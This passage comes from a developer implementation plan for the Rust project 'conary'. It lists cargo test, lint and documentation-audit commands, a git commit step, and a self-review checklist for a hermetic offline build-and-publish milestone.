cargo test -p conary-core recipe::kitchen
cargo test -p conary-core container::analysis
cargo test -p conary --lib commands::cook
cargo test -p conary --lib commands::publish
cargo test -p conary --test packaging_m2a
cargo test -p conary --test packaging_m1b
cargo test -p conary --test static_repo_m1a
cargo test -p conary-core
cargo test -p conary
```

Expected: all targeted tests pass.

- [ ] **Step 4: Run workspace and doc gates**

Run:

```bash
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo run -p conary-test -- list
cargo test -p conary --lib cli::tests
cargo run -p conary -- --help
cargo run -p conary -- cook --help
cargo run -p conary -- publish --help
scripts/check-coherency-ledger.sh docs/superpowers/feature-coherency-ledger.tsv
scripts/check-doc-audit-ledger.sh docs/superpowers/documentation-accuracy-audit-ledger.tsv --require-complete
scripts/check-doc-truth.sh
bash scripts/docs-audit-inventory.sh | diff -u docs/superpowers/documentation-accuracy-audit-inventory.tsv -
git diff --check
```

Expected: all commands exit 0.

- [ ] **Step 5: Commit docs**

```bash
git add docs/ARCHITECTURE.md docs/modules/recipe.md docs/modules/ccs.md docs/modules/feature-ownership.md docs/llms/subsystem-map.md docs/superpowers/documentation-accuracy-audit-inventory.tsv docs/superpowers/documentation-accuracy-audit-ledger.tsv
git commit -m "docs(packaging): document M2a hermetic publish foundation"
```

---

## Self-Review Checklist

- [ ] M2a does not create or embed signed build-attestation envelopes.
- [ ] M2a does not unlock artifact-form publish.
- [ ] Every path that emits `hardening_level = "hermetic"` uses pristine/no-host-mount Kitchen execution and records builder environment identity.
- [ ] Every path that emits `hardening_level = "hermetic"` also has recipe identity, primary and additional source identity, command-risk report, ecosystem policy report, dependency-lock evidence or fail-closed refusal, reproducibility record, and offline Kitchen execution.
- [ ] `source_download_policy = OfflineCacheOnly` blocks cache misses in hermetic build `prep()`.
- [ ] Local source materialization uses the same file list that was hashed, re-verifies each hash immediately before copy, rejects path escapes, and preserves safe symlinks.
- [ ] Cargo is the only accepted ecosystem path in M2a unless the implementing agent adds a fully tested policy for another ecosystem inside this plan.
- [ ] Cargo registry dependencies are accepted only with recorded vendor/cache and `.cargo/config.toml` source-replacement identity.
- [ ] Package-manager fetch and dynamic language execution are at least medium-risk for runtime auto-sandboxing.
- [ ] Project-form publish is proven end-to-end to write hermetic evidence without signed build-attestation envelopes.
- [ ] Artifact-form publish refusal is proven against an actual M2a-produced `.ccs`, not only a nonexistent path.
- [ ] Docs and docs-audit rows are updated with the landed ownership paths.
